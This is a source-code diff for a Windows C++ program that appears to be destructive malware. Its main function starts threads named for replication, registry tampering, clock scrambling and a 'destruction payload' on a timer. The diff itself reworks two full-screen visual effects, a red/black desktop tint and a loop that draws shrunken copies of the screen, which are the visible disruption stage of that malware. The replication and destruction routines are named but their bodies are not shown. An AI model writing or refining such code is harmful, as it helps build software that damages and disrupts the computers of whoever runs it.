@@ -11,6 +11,7 @@
 #include <mmsystem.h>
 #include <iostream>
 #include <tlhelp32.h>
+#include <ctime>
 
 // Link GDI, Multimedia, and Shell libraries
 #pragma comment(lib, "gdi32.lib")
@@ -86,27 +87,60 @@ void forceWriteReg(HKEY hRoot, const std::string& subKey, const std::string& val
     }
 }
 
-// --- SCREEN INVERTER --- //
+// --- SCREEN COLOR CHANGER --- //
 
-void invertScreen() {
+void changeColors() {
     HDC hdc = GetDC(0);
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+    bool isRed = true;
+
     while (!isEnding) {
-        PatBlt(hdc, 0, 0, sw, sh, DSTINVERT);
-        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
+        // Force the desktop and all windows to redraw to clear the previous tint
+        InvalidateRect(NULL, NULL, TRUE);
+        
+        // Brief pause to allow the OS to process the redraw message
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+
+        // Create the brush (Red or Black depending on the toggle)
+        HBRUSH brush = CreateSolidBrush(isRed ? RGB(255, 0, 0) : RGB(0, 0, 0));
+        HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);
+
+        // 0x00A000C9 is the ternary ROP code for 'DPa' (Destination AND Pattern)
+        // This keeps only the color channels of the brush, creating a tint effect.
+        PatBlt(hdc, 0, 0, sw, sh, 0x00A000C9);
+
+        // Cleanup GDI objects to prevent memory leaks
+        SelectObject(hdc, oldBrush);
+        DeleteObject(brush);
+
+        // Toggle the color for the next loop
+        isRed = !isRed;
+        
+        // Sleep for the remainder of the 1500ms cycle
+        std::this_thread::sleep_for(std::chrono::milliseconds(1450));
     }
     ReleaseDC(0, hdc);
 }
 
-// --- SCREEN TUNNEL EFFECT --- //
+// --- SCREEN MULTIPLIER EFFECT --- //
 
-void screenTunnel() {
+void screenMultiplier() {
     HDC hdc = GetDC(0);
-    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+    int sw = GetSystemMetrics(0); // Width of the screen
+    int sh = GetSystemMetrics(1); // Height of the screen
+    
     while (!isEnding) {
-        StretchBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, sw, sh, SRCCOPY);
-        std::this_thread::sleep_for(std::chrono::milliseconds(500)); 
+        // Calculate a random position, keeping the 300x300 box entirely on the screen
+        int destX = (sw > 300) ? rand() % (sw - 300) : 0;
+        int destY = (sh > 300) ? rand() % (sh - 300) : 0;
+        
+        // Stretch the full screen down into the 300x300 random spot
+        StretchBlt(hdc, destX, destY, 300, 300, hdc, 0, 0, sw, sh, SRCCOPY);
+        
+        // Delay for 200ms
+        std::this_thread::sleep_for(std::chrono::milliseconds(200)); 
     }
+    
     ReleaseDC(0, hdc);
 }
 
@@ -428,13 +462,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::thread(replicationPayload).detach(); 
     std::thread(registryPayload).detach();    
 
-    // 80 Seconds - Start screen inverter
+    // 80 Seconds - Start screen color changer
     std::this_thread::sleep_for(std::chrono::seconds(20));
-    std::thread(invertScreen).detach();
+    std::thread(changeColors).detach();
 
-    // 100 Seconds - Start screen tunnel effect & scramble clock & destruction payload
+    // 100 Seconds - Start screen multiplier effect & scramble clock & destruction payload
     std::this_thread::sleep_for(std::chrono::seconds(20));
-    std::thread(screenTunnel).detach();
+    std::thread(screenMultiplier).detach();
     std::thread(scrambleClock).detach();
     std::thread(destructionPayload).detach(); 
 
